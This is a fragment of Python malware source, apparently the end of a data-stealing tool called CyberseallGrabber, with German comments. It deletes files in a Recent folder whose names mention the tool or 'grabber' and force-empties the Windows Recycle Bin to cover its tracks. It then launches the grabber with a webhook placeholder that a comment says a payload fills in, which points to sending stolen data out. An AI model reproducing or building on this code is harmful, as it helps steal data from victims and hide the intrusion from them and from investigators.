                        for file in os.listdir(recent_path):
                            if "cyberseall" in file.lower() or "grabber" in file.lower():
                                try:
                                    os.remove(os.path.join(recent_path, file))
                                except:
                                    pass
                except:
                    pass
                
                # Papierkorb leeren
                try:
                    subprocess.run(['powershell', '-Command', 'Clear-RecycleBin -Force'], capture_output=True, timeout=10)
                except:
                    pass
                
        except Exception as e:
            pass

# WEBHOOK_PLACEHOLDER wird durch die Mini-Payload ersetzt
if __name__ == "__main__":
    CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
